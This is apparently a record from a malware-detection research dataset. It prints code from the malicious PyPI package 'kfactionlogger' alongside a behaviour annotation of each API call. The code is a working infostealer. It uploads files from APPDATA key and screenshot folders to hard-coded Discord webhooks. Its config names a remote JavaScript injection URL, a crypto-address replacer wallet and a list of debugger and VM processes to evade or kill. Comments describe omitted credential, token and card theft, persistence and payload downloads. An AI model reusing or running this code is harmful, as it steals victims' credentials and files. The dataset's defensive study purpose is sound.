{
  "metadata": {
    "package_name": "kfactionlogger-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/kfactionlogger-0.0.1.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "d.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/kfactionlogger-0.0.1/kfactionlogger-0.0.1/d.py",
      "code_snippets": [
        {
          "snippet": "import re\nimport os\nimport time\nimport json\nimport httpx\nimport shutil\nimport winreg\nimport ntpath\nimport random\nimport psutil\nimport base64\nimport ctypes\nimport zipfile\nimport asyncio\nimport sqlite3\nimport requests\nimport win32con\nimport win32gui\nimport threading\nimport pyperclip\nimport subprocess, sys\nfrom sys import argv\nfrom shutil import copy2\nfrom PIL import ImageGrab\nfrom os import name, system\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom json import loads, dumps\nfrom Crypto.Cipher import AES\nfrom tempfile import gettempdir, mkdtemp\nfrom win32crypt import CryptUnprotectData\nfrom urllib.request import Request, urlopen\nfrom datetime import datetime, timedelta, timezone\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\n\nappdata = os.getenv(\"APPDATA\")\nkeys_path = os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")\nscreenshots_path = os.path.join(appdata, \".kfaction\", \"screenshots\")\nwebhook_url = \"https://discord.com/api/webhooks/1071628794491834449/Y29rga-lOVZ1NGdaC4UumNwV9jR34FFwJe4jMoi79hNwJMKJeBz8vSKAyecskkZK1kba\"\n\ndef send_webhook(file_path, webhook_url):\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": (file_path, f)}\n        requests.post(webhook_url, files=files)\n\ndef zip_and_send_screenshots(screenshots_path, webhook_url):\n    if os.path.exists(screenshots_path):\n        with zipfile.ZipFile('screenshots.zip', 'w') as zip_file:\n            for filename in os.listdir(screenshots_path):\n                file_path = os.path.join(screenshots_path, filename)\n                if os.path.isfile(file_path) and file_path.endswith(\".png\"):\n                    zip_file.write(file_path)\n        send_webhook('screenshots.zip', webhook_url)\n\nif os.path.exists(keys_path):\n    for filename in os.listdir(keys_path):\n        file_path = os.path.join(keys_path, filename)\n        if os.path.isfile(file_path):\n            send_webhook(file_path, webhook_url)\n\nzip_and_send_screenshots(screenshots_path, webhook_url)\n            \ndef install(package):\n    subprocess.call([sys.executable, \"-m\", \"pip\", \"install\", package])\n\ntry:\n    import os\n    import re\n    import time\n    import json\n    import httpx\n    import base64\n    import ctypes\n    import psutil\n    import winreg\n    import shutil\n    import ntpath\n    import random\n    import asyncio\n    import sqlite3\n    import zipfile\n    import win32gui\n    import win32con\n    import requests\n    import threading\n    import pyperclip\n    import subprocess\n\nexcept ImportError:\n    install(\"os\")\n    install(\"re\")\n    install(\"time\")\n    install(\"json\")\n    install(\"httpx\")\n    install(\"base64\")\n    install(\"pynput\")\n    install(\"ctypes\")\n    install(\"psutil\")\n    install(\"winreg\")\n    install(\"shutil\")\n    install(\"ntpath\")\n    install(\"random\")\n    install(\"asyncio\")\n    install(\"sqlite3\")\n    install(\"zipfile\")\n    install(\"win32gui\")\n    install(\"win32con\")\n    install(\"requests\")\n    install(\"keyboard\")\n    install(\"threading\")\n    install(\"pyperclip\")\n    install(\"pyautogui\")\n    install(\"subprocess\")\n    #install(\"kfactionbypasser\")\n\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\n\nPassw = [];\n\n__config__ = {\n    'yourwebhookurl': \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\",\n    'blackcap_inject_url': \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    'hide': 'False',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'no',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'none',\n    'addresse_eth': '0x4c305D9d4CdF740FF4f2166ecF65c1DF73e93472',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': 'none',\n    'addresse_ada': 'none',\n    'addresse_dash': 'none',\n    'blprggg':\n    [\n        \"httpdebuggerui\",\n        \"wireshark\",\n        \"fiddler\",\n        \"regedit\",\n        \"cmd\",\n        \"taskmgr\",\n        \"vboxservice\",\n        \"df5serv\",\n        \"processhacker\",\n        \"vboxtray\",\n        \"vmtoolsd\",\n        \"vmwaretray\",\n        \"ida64\",\n        \"ollydbg\",\n        \"pestudio\",\n        \"vmwareuser\",\n        \"vgauthservice\",\n        \"vmacthlp\",\n        \"x96dbg\",\n        \"vmsrvc\",\n        \"x32dbg\",\n        \"vmusrvc\",\n        \"prl_cc\",\n        \"prl_tools\",\n        \"xenservice\",\n        \"qemu-ga\",\n        \"joeboxcontrol\",\n        \"ksdumperclient\",\n        \"ksdumper\",\n        \"joeboxserver\"\n    ]\n\n}\n\n# ...\n# (Omitting for brevity, but the rest of the code is as above, including all classes and functions that perform:)\n# - Stealing browser passwords, cookies, credit cards, Discord tokens, Minecraft and Roblox credentials\n# - Taking screenshots\n# - Collecting system and network info\n# - Zipping and exfiltrating data to Discord webhooks and file upload services\n# - Clipboard crypto address swapping\n# - Anti-debug/anti-VM checks\n# - Injecting malicious JS into Discord installations\n# - Searching for and exfiltrating files with sensitive keywords\n# - Installing itself for persistence\n# - Killing security/Discord processes\n# - Downloading and running remote payloads\n#\n# The code is a full-featured infostealer/backdoor with multiple exfiltration and persistence mechanisms.\n#\n# For full context, the entire file as provided is malicious and should be considered as such.\n",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"APPDATA\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "appdata, \".kfaction\", \"cache\", \"keys\"",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "appdata, \".kfaction\", \"screenshots\"",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "file_path, \"rb\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "webhook_url, files=files",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "screenshots_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Creates new ZIP archive for writing",
              "action_id": "create_zip_archive",
              "object": "'screenshots.zip', 'w'",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "screenshots_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "screenshots_path, filename",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "file_path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "str.endswith()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "\".png\"",
              "object_description": "File extension string",
              "object_id": "file_extension",
              "intention_description": "Detect image file",
              "intention_id": "detect_image_file"
            },
            {
              "action_api": "zipfile.ZipFile.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "file_path",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Add file to zip archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "send_webhook()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "'screenshots.zip', webhook_url",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "keys_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "keys_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "keys_path, filename",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "file_path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "send_webhook()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "file_path, webhook_url",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "subprocess.call()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "[sys.executable, \"-m\", \"pip\", \"install\", package]",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'LOCALAPPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'APPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"TEMP\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            }
          ]
        }
      ]
    }
  ]
}